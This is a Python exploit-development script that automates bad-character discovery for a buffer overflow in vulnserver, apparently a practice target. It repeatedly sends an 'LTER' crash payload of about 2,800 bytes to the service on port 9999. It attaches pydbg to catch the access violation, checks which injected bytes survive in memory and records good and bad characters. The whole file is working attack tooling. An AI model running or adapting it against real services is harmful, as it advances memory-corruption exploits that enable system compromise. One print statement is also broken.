import os
import socket
import subprocess
import sys
import threading
import time
import wmi

from pydbg import *
from pydbg.defines import *


#Global variables

allchars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13"
    "\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26"
    "\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39"
    "\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c"
    "\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72"
    "\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85"
    "\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98"
    "\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab"
    "\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe"
    "\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1"
    "\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4"
    "\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
    "\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

# CHANGE ME!
request_template = (
    "LTER .{}"
)


# CHANGE ME!
processName = "vulnserver.exe" # name of the process as it appears in tasklist
executable = "C:\\Documents and Settings\\Administrator\\Desktop\\vulnserver\\vulnserver.exe" # path the executable to start the process
start_buffer_address = "\x0C\xFA\xB7\x00" #address where our 92 characters start, need to flip it around from how it appears in immunity
listeningPort = 9999 # Address of the listening process
crashLoad = "A"*2010 + "{}" + "C"*702 # load to crash the proces with {} representing where our test chars will go
responsive_test_string = "HELP" # valid payload to send to the server to test connection 
crash_wait_timeout = 10 # seconds to wait after a payload has been sent

cur_char = ""    # Current char that is being checked
badchars = []
goodchars = []
evil_str_sent = False
service_is_running = False


def chars_to_str(chars):
    """Convert a list of chars to a string"""
    result = ""
    for char in chars:
        result += "\\x{:02x}".format(ord(char))
    return result


def crash_service():
    """Send malformed data to ovas service in order to crash it. Function
    runs in an independent thread"""

    global evil_str_sent, cur_char, badchars, goodchars, allchars
    global service_is_running

    char_counter = -1
    timer = 0
    while True:
        if not service_is_running:   # Don't send evil string if process is not running
            time.sleep(2)
            continue

        # If main loop reset the evil_str_sent flag to False, sent evil_str again
        if not evil_str_sent:
            timer = 0
            
            char_counter += 1
            if char_counter > len(allchars)-1:
                ("[+] Bad chars: {}.".format(chars_to_str(badchars)))
                print("[+] Good chars: {}.".format(chars_to_str(goodchars)))
                print("[+] Done.")
                
                os._exit(0) # Hack to exit application from non-main thread

            cur_char = allchars[char_counter]
            #crash = "A"*2010 + cur_char*92 + "C"*702 # CHANGE ME!
            crash = crashLoad.format(cur_char*92)
            evil_str = request_template.format(crash)

            print("[*] Sending evil HTTP request...")
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect(("127.0.0.1", listeningPort))
                sock.send(evil_str)
                #sock.close()
            except:
                print("[*] Error sending malicious buffer; service may be down.")
                print("[*] Restarting the service and retrying...")

                service_is_running = False
                subprocess.Popen('taskkill /f /im ' +  processName).communicate() # CHANGE ME!
            finally:
                evil_str_sent = True

        else:
            if timer > crash_wait_timeout:
                print("[*] "+str(crash_wait_timeout)+" seconds passed without a crash. Bad char "
                      "probably prevented the crash.")
                print("[*] Marking last char as bad and killing the service...")

                badchars.append(cur_char)
                print("[*] Bad chars so far: {}.".format(chars_to_str(badchars)))
                with open("badchars.txt",'w') as f:
                    f.write(chars_to_str(badchars))

                service_is_running = False
                subprocess.Popen('taskkill /f /im ' +  processName).communicate() # CHANGE ME!
            
            time.sleep(1)
            timer += 1
    return


def is_service_started():
    """Check if service was successfully started"""
    print("[*] Making sure the service was restarted...")
    service_check_counter = 0
    while not service_is_running:
        if service_check_counter > 4: # Give it 5 attempts
            return False
        for process in wmi.WMI().Win32_Process():
            if process.Name==processName: # CHANGE ME!
                return process.ProcessId
        service_check_counter += 1
        time.sleep(1)


def is_service_responsive():
    """Check if service responds to HTTP requests"""
    print("[*] Making sure the service responds to HTTP requests...")
    service_check_counter = 0
    while not service_is_running:
        if service_check_counter > 4: # Give it 5 attempts
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("127.0.0.1", listeningPort)) # CHANGE ME!
            #test_str = request_template.format("127.0.0.1")
            test_str = responsive_test_string
            sock.send(test_str)
            sock.settimeout(1) # Give response 1 second to arrive
            resp = sock.recv(1024)
            if resp:
                return True
            sock.close()
        except Exception as e:
            pass

        service_check_counter += 1


def restart_service():
    """Restart ovas.exe service and return its PID"""

    global service_is_running
    service_is_running = False

    # Check that the service is running before stopping it
    for process in wmi.WMI().Win32_Process():
        if process.Name==processName: # CHANGE ME!
            print("[*] Stopping the service...")
            # Forcefully terminate the process
            subprocess.Popen('taskkill /f /im ' +  processName).communicate() # CHANGE ME!

    print("[*] Starting the service...")
    #subprocess.Popen(executable).communicate()  # This adds to reliability # CHANGE ME!
    #subprocess.Popen('ovstart -c ovas').communicate() # Start the process # CHANGE ME!
    subprocess.Popen(executable)

    pid = is_service_started()
    if pid:
        print("[*] The service was restarted.")
    else:
        print("[-] Service was not found in process list. Restarting...")
        return restart_service()

    if is_service_responsive():
        print("[*] Service responds to HTTP requests. Green ligth.")
        service_is_running = True
        return pid
    else:
        print("[-] Service does not respond to HTTP requests. Restarting...")
        return restart_service()


def check_char(rawdata):
    """Compare the buffer sent with the one in memory to see if
    it has been mangled in order to identify bad characters."""
    
    global badchars, goodchars
    
    hexdata = dbg.hex_dump(rawdata)
    print("[*] Buffer: {}".format(hexdata))

    # Sent data must be equal to data in memory - http://A*8+BADCHARS+B*8
    if rawdata == cur_char*92: # CHANGE ME!
        goodchars.append(cur_char)
        print("[*] Char {} is good.".format(chars_to_str(cur_char)))
        print("[*] Good chars so far: {}.".format(chars_to_str(goodchars)))
        with open("goodchars.txt",'w') as f:
            f.write(chars_to_str(goodchars))
    else:
        badchars.append(cur_char)
        print("[*] Char {} is bad.".format(chars_to_str(cur_char)))
        print("[*] Bad chars so far: {}.".format(chars_to_str(badchars)))
        with open("badchars.txt",'w') as f:
            f.write(chars_to_str(badchars))
    return


def _access_violation_handler(dbg):
    """On access violation read data from a pointer on the stack to
    determine if the sent buffer was mangled in any way"""

    print("[*] Access violation caught.")

    # At 0x1C from ESP we find a pointer to our buffer
    #esp_offset = 0x1C # CHANGE ME!
    #00B7FA0C   01010101  
    #buf_address = dbg.read(dbg.context.Esp + esp_offset, 0x4) # CHANGE ME!
    buf_address = start_buffer_address
    buf_address = dbg.flip_endian_dword(buf_address)
    print("[DEBUG] buf_address: {}".format(buf_address))
    if buf_address:
        # Read first 115 bytes of the buffer - http://A*8+cur_char*92+B*8 string
        # For vulnserver we want the first 2010 + 92 + 
        bufferSize = 0x5C # hex of 92
        buffer = dbg.read(buf_address, bufferSize) # CHANGE ME!
    else:
        # Now when the first request sent is the one for checking if the
        # service responds, the buf_address sometimes returns 0. This is to 
        # handle that case.
        buffer = ""
    
    print("[*] Checking whether the char is good or bad...")
    check_char(buffer)

    dbg.detach()

    return DBG_EXCEPTION_NOT_HANDLED


def debug_process(pid):
    """Create a debugger instance and attach to ovas PID"""
    
    dbg = pydbg()
    dbg.set_callback(EXCEPTION_ACCESS_VIOLATION, _access_violation_handler)

    while True:
        try:
            print("[*] Attaching debugger to pid: {}.".format(pid))
            if dbg.attach(pid):
                return dbg
            else:
                return False
        except Exception as e:
            print("[*] Error while attaching: {}.".format(e.message))
            return False


if __name__ == '__main__':

    # Create and start crasher thread
    crasher_thread = threading.Thread(target=crash_service)
    crasher_thread.setDaemon(0)
    crasher_thread.start()
    
    # Main loop
    while True:
        pid = restart_service()
        dbg = debug_process(pid)
        if dbg:
            # Tell crasher thread to send malicious input to process
            evil_str_sent = False 
            dbg.run()             # Enter the debugging loop